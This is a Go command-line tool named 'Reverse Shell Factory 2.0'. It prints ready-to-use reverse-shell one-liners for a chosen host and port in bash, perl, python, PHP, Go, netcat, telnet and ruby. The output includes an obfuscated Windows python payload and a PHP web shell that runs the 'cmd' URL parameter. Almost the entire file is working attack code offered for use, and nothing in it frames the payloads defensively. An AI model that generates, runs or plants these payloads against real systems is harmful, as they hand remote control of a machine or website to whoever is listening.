package main

import (
	"flag"
	"fmt"
	"os"
)

type pbuild struct {
	payload string
	version string
	host   string
	port   string
	os     string
}

func (c pbuild)shells() string {
	var s string
	if c.payload == "bash" {
		if c.version == "default" {
			s = "bash -c 'exec bash -i &>/dev/tcp/"+c.host+"/"+c.port+" <&1'"
		} else if c.version == "tiny" {
			s = "/bin/bash -i >& /dev/tcp/"+c.host+"/"+c.port+" 0>&1"
		} else if c.version == "udp" {
			s = "sh -i >& /dev/udp/"+c.host+"/"+c.port+" 0>&1"
		} else if c.version == "exec" {
			s = "exec bash -i &>/dev/tcp/"+c.host+"/"+c.port+" <&1"
		}
	} else if c.payload == "perl" {
		if c.os == "linux" {
			s = `perl -e 'use Socket;$i="`+c.host+`";$p=`+c.port+`;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
		} else if c.os == "windows" {
			s = `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"`+c.host+`:`+c.port+`");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`
		}
	} else if c.payload == "py" {
		if c.os == "linux" {
			if c.version == "default" {
				s = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("`+c.host+`",`+c.port+`));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
			} else if c.version == "pty" {
				s = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("`+c.host+`",`+c.port+`));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
			} else if c.version == "py3" {
				s = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("`+c.host+`",`+c.port+`));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
			}
		} else if c.os == "windows" {
			s = `C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('`+c.host+`', `+c.port+`)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"`
		}
	} else if c.payload == "php" {
		if c.os == "linux" {
			if c.version == "default" {
				s = `php -r '$sock=fsockopen("`+c.host+`",`+c.port+`);exec("/bin/sh -i <&3 >&3 2>&3");'`
			} else if c.version == "" {
				s = `exec("/bin/bash -c 'bash -i > /dev/tcp/`+c.host+`/`+c.port+` 0>&1'");`
			} else if c.version == "exec-reverseshell-full" {
				s = `<?php exec("/bin/bash -c 'bash -i > /dev/tcp/`+c.host+`/`+c.port+` 0>&1'"); ?>`
			} else if c.version == "system-reverseshell" {
				s = `system("/bin/bash -c 'bash -i > /dev/tcp/`+c.host+`/`+c.port+` 0>&1'");`
			} else if c.version == "system-reverseshell-full" {
				s = `<?php system("/bin/bash -c 'bash -i > /dev/tcp/`+c.host+`/`+c.port+` 0>&1'"); ?>`
			} else if c.version == "webshell" {
				s = `<?php system($_GET["cmd"]);?>`
			}
		}
	} else if c.payload == "go" {
		if c.os == "linux" {
			if c.version == "default" {
				s = `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","`+c.host+`:`+c.port+`");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`
			} else if c.version == "tiny" {
				s = `package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","`+c.host+`:`+c.port+`");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}`
			}
		}
	} else if c.payload == "nc" {
		if c.os == "linux" {
			if c.version == "e" {
				s = `nc -e /bin/bash `+c.host+` `+c.port+``
			} else if c.version == "c" {
				s = `nc -c bash `+c.host+` `+c.port+``
			} else if c.version == "default" {
				s = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc `+c.host+` `+c.port+` >/tmp/f`
			}
		}
	} else if c.payload == "telnet" {
		s = `TF=$(mktemp -u); mkfifo $TF && telnet `+c.host+` `+c.port+` 0<$TF | /bin sh 1>$TF`
	} else if c.payload == "ruby" {
		if c.os == "linux" {
			if c.version == "default" {
				s = `ruby -rsocket -e'f=TCPSocket.open("`+c.host+`",`+c.port+`).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
			}
		} else if c.os == "windows" {
			s = `ruby -rsocket -e 'c=TCPSocket.new("`+c.host+`","`+c.port+`");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`
		}
	}

	return s
}

func main() {
	var host = flag.String("host","0.0.0.0","Local Host.")
	var port = flag.String("port","4444","Local Port.")
	var ops   = flag.String("os","linux","Operating system of the target.")
	var payl = flag.String("p","bash","Payload to use.")
	var ver  = flag.String("v","default","Version of payload.")
	var h 	 = flag.Bool("h",false,"Help Menu")
	flag.Parse()

	if *h {
		println(_help())
		os.Exit(1)
	}

	// New payload
	nP := new(pbuild)
	nP.host    = *host
	nP.port    = *port
	nP.payload = *payl
	nP.version = *ver
	nP.os      = *ops

	fmt.Println(nP.shells())

}

func _help() string {
	return `
REVERSE SHELL FACTORY 2.0

COMMANDS DESCRIPTION
-------- -----------
-h       Help Menu.
-host    Local Host.
-port    Local Port.
-p       Payload.
-os      Operating system.
-v       Version of the payload

LIST OF PAYLOADS
---- -- --------
bash
    default - Normal payload.
    tiny    - To put inside of bash files.
    udp     - UDP connection.
    exec    - Use function exec(). To put inside of bash files.

perl
    linux
        default - Normal payload.
    windows
        default - Normal payload.

py
    linux
        default - Normal payload.
        pty     - Auto spawn pty.
        py3     - Python3.
    windows
        default - Normal payload.

php
    linux
        default                  - Normal payload.
        USED IN WEB PHP FILES:
        exec-reverseshell        - Function exec().
        exec-reverseshell-full   - With php header and footer.
        system-reverseshell      - Function system().
        system-reverseshell-full - With php header and footer.
        webshell                 - Simple web shell.

go
    linux
        default - Normal payload for execution in command line.
        tiny    - Payload to put in files.

nc
    linux
        default - Normal payload.
        c       - Shell command with bash as default.
        e       - Program to exec with bash as default.

telnet
    linux
        default - Normal payload.

ryby 
    linux
        default - Normal payload.
    windows
        default - Normal payload.
`
}
